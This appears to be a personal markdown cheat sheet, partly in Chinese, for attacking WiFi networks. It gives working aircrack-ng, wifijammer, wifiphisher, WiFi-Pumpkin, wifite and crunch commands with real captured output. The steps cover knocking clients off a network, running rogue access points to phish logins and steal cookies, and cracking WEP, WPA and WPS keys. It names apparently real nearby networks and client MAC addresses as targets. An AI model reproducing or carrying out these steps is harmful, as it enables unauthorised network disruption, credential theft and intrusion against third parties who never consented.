# Attack

<!-- TOC -->

- [Attack](#attack)
    - [Pre-connection Attack](#pre-connection-attack)
        - [Network Client discovery](#network-client-discovery)
        - [Deauthentication Attack Targeted **one** Client](#deauthentication-attack-targeted-one-client)
        - [Deauthentication Attack Targeted **all** Client](#deauthentication-attack-targeted-all-client)
        - [Creating a Fake Access Point Method 1](#creating-a-fake-access-point-method-1)
        - [Creating a Fake Access Point Method 2(Advanced)](#creating-a-fake-access-point-method-2advanced)
    - [Gaining Access](#gaining-access)
        - [WEP Cracking](#wep-cracking)
        - [Universal Attacking tool](#universal-attacking-tool)
        - [WPAWPA2 - Capturing Handshake](#wpawpa2---capturing-handshake)
        - [WPAWPA2 - Dictionary Attack](#wpawpa2---dictionary-attack)
        - [WPS Cracking](#wps-cracking)
        - [diy wordlist](#diy-wordlist)

<!-- /TOC -->

## Pre-connection Attack

### Network Client discovery

1. change mac address
    ```bash
    ifconfig wlan0 down
    macchanger -A wlan0
    ifconfig wlan0 up
    ```
2. wlan0 to monitor: `airmon-ng start wlan0`
3. quick scan: `airodump-ng wlan0mon`
    ```bash
    ##路由器
    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
    60:45:CB:B0:6E:A8  -80        1        0    0   3  54e  WPA2 CCMP   PSK  Zhao_Lab                                                                           
    C8:3A:35:47:3A:E8  -75        2        0    0   3  54e  WPA2 CCMP   PSK  Tenda_1401                                                                         
    DC:FE:18:38:31:A1  -83        2        0    0  13  54e. WPA2 CCMP   PSK  hailingkeji                                                                        
    B0:C5:54:D7:9B:96  -72        2        2    0   1  54e  WPA2 CCMP   PSK  ionbeam412                                                                         
    1C:1D:86:F6:E8:D0  -78        1        0    0   1  54e. WPA2 CCMP   PSK  agch                                                                                
    80:D4:A5:6D:30:C9  -76        2        0    0   1  54e. WPA2 CCMP   PSK  tuniondata                                                                          
    80:F6:2E:1C:90:F0  -76        2        0    0   1  54e. OPN              ChinaUnicom                                                                        
    80:F6:2E:1C:90:F1  -73        2        0    0   1  54e. OPN              CCB                                                                                
    80:F6:2E:1C:90:F2  -72        2        0    0   1  54e. OPN              <length:  0>                                                                       
    DC:FE:18:2A:A6:32  -76        2        0    0   1  54e  WPA2 CCMP   PSK  TP-LINK_A632                                                                       
    30:FC:68:C2:9A:6F  -66        2        0    0   1  54e. WPA2 CCMP   PSK  1223                                                                               
    74:1E:93:62:6F:38  -74        2        0    0   1  54e  WPA  CCMP   PSK  CU_bIOL                                                                            
    28:6C:07:9E:6A:F5  -41        3       11    1   8  54e  OPN              316                                                                                
    ## 路由器和客户端                                                                                                                                                                 
    BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                    
    (not associated)   5C:C5:D4:C9:52:6B  -50    0 - 1      0        1                                                                                           
    (not associated)   78:11:DC:01:AD:B1  -68    0 - 1      0        1  wyg                                                                                      
    (not associated)   82:99:5C:81:4B:19  -76    0 - 1      3        3  JYPNet_5G                                                                                
    28:6C:07:9E:6A:F5  94:65:2D:31:03:F1  -56    0e- 0e     0        4                                                                                           
    28:6C:07:9E:6A:F5  FC:FC:48:DA:CE:5B   -1    0e- 0      0        9 
    ```
4. 查看某一个路由器上面的client,可以在[MacVendor](https://macvendors.com/)上面查看厂家
    ```bash
    #查看316上面的client
    airodump-ng wlan0mon --bssid  28:6C:07:9E:6A:F5 --channel 8
    ##output
    BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
    28:6C:07:9E:6A:F5  -44 100     2086     1986    0   8  54e  OPN              316                                                                            
    BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                   
    28:6C:07:9E:6A:F5  18:BC:5A:81:9A:0C  -42    0e- 0e     0       57                                                                                           
    28:6C:07:9E:6A:F5  28:C6:3F:C9:66:C5  -60    1e- 1e     0       39                                                                                           
    28:6C:07:9E:6A:F5  8C:A9:82:43:43:1A  -62    0 - 0e     0       42                                                                                           
    28:6C:07:9E:6A:F5  00:DB:DF:85:9E:3B  -66    0e- 6e     0      531                                                                                           
    28:6C:07:9E:6A:F5  AC:C1:EE:33:C0:08  -68    1e- 1e     0     1795                                                                                           
    28:6C:07:9E:6A:F5  8C:85:90:2B:11:A1  -68    0 - 6      0        4
    ```
    > 只要抓到包，就停止下面的Deauth攻击, 开始跑字典了  
    > 或者指定保存的文件`airodump-ng wlan0mon --write result --bssid  28:6C:07:9E:6A:F5 --channel 8`
### Deauthentication Attack Targeted **one** Client

原理：伪装成路由器(自动修改自身的mac address)，发送断开包给client,将client断开.使用的是**package injection**

```bash
#攻击方式是:deauth;
#发送2000个deauth包;--deauth
#ap(access point)是316;-a
#target_client是18:BC:5A:81:9A:0C;-c
aireplay-ng --deauth 2000 -a 28:6C:07:9E:6A:F5 -c 18:BC:5A:81:9A:0C wlan0mon

##output
18:58:56  Waiting for beacon frame (BSSID: 28:6C:07:9E:6A:F5) on channel 8
18:58:57  Sending 64 directed DeAuth. STMAC: [18:BC:5A:81:9A:0C] [ 1|62 ACKs]
18:58:57  Sending 64 directed DeAuth. STMAC: [18:BC:5A:81:9A:0C] [ 0|58 ACKs]
18:58:58  Sending 64 directed DeAuth. STMAC: [18:BC:5A:81:9A:0C] [ 8|59 ACKs]
18:58:59  Sending 64 directed DeAuth. STMAC: [18:BC:5A:81:9A:0C] [ 6|62 ACKs]
18:58:59  Sending 64 directed DeAuth. STMAC: [18:BC:5A:81:9A:0C] [ 2|65 ACKs]
18:59:00  Sending 64 directed DeAuth. STMAC: [18:BC:5A:81:9A:0C] [ 0|62 ACKs]
18:59:01  Sending 64 directed DeAuth. STMAC: [18:BC:5A:81:9A:0C] [ 0|63 ACKs]
```

### Deauthentication Attack Targeted **all** Client

采用github上面的工具：[wifijammer](https://github.com/DanMcInerney/wifijammer)

`wget https://raw.githubusercontent.com/DanMcInerney/wifijammer/master/wifijammer.py`

```bash
#help,其中最后一条--world，如果不在美国，需要添加参数--world
#(因为美国的总channels=11,日本总channes=14,其他地方总channels=13)
python wifijammer.py --help

#踢掉所有316的clients
python wifijammer.py --world -a 28:6C:07:9E:6A:F5

##output
[+] wlan0mon channel: 2

                  Deauthing                 ch   ESSID
[*] 28:6c:07:9e:6a:f5 - 28:c6:3f:c9:66:c5 - 8  - 316
[*] 18:bc:5a:81:9a:0c - 28:6c:07:9e:6a:f5 - 8  - 316
[*] 8c:a9:82:43:43:1a - 28:6c:07:9e:6a:f5 - 8  - 316

      Access Points     ch   ESSID
[*] 28:6c:07:9e:6a:f5 - 8  - 316
```

```bash
#简单方法
#kick all continuously
aireplay-ng --deauth 0 -a 28:6C:07:9E:6A:F5 wlan0mon
```

### Creating a Fake Access Point Method 1

钓鱼法: 创建一个和某个路由器相同的AP,然后钓鱼，需要两个网卡

采用github上面的工具：[wifiphisher](https://github.com/DanMcInerney/wifijammer)

```bash
#git clone repo
git clone https://github.com/wifiphisher/wifiphisher
#install
cd wifiphisher/
python setup.py install
```

Requirement: One wireless network adapter that supports **AP & Monitor mode** and is capable of **injection**;For advanced mode, you need two cards; one that supports AP mode and another that supports Monitor mode.

直接`wifiphisher`,然后再界面上选择要钓鱼的路由器；选择钓鱼界面；然后等鱼上钩

### Creating a Fake Access Point Method 2(Advanced)

钓鱼法: 创建一个和某个路由器相同的AP,然后钓鱼(窃取其他账号)

采用github上面的工具：[WiFi-Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin),可以track every request made by client,还可以**dns Spoof**, **Transparent Proxy**(inject javascript, get cookies)

```bash
git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git
cd WiFi-Pumpkin
./installer.sh --install
#to use
wifi-pumpkin
```

调整GUI中的SSID和channel到目标AP;

## Gaining Access

3 Encryption:

- WEP
- WPA
- WPA2(PSK)
- WPA2(Enterprise)

### WEP Cracking

使用：**fern-wifi-cracker**

```bash
fern-wifi-cracker
#然后弹出GUI
#选择WEP那个，然后点击Attack
```

破解速度取决于: 密码的复杂度、加密复杂度、电脑性能

### Universal Attacking tool

使用的是**wifite**(`wifite --help`)

```bash
#直接wifite进行monitor,然后Ctrl+C，用序号选择target-ap
wifite
```

### WPAWPA2 - Capturing Handshake

直接用上面的wifiite就可以了，生成`.cap`的文件

### WPAWPA2 - Dictionary Attack

直接在fern里面也可以跑

wifite抓包，然后`aircrack-ng -w /root/wifiDict/simpleDict.txt ionbeam412_B0-C5-54-D7-9B-96.cap`

### WPS Cracking

3~10Hours

```bash
wash -i wlan0mon
```

### diy wordlist

```bash
#最小长度5；最大长度7；字符集123456abc；
crunch 5 7 123456abc -o myDict.txt

#7位，以a开头，以b结尾，中间@是5个lowercase
#,是upper case
#%,是number
#^,是symbols
crunch 7 7 abdegeshji -t a@@@@@b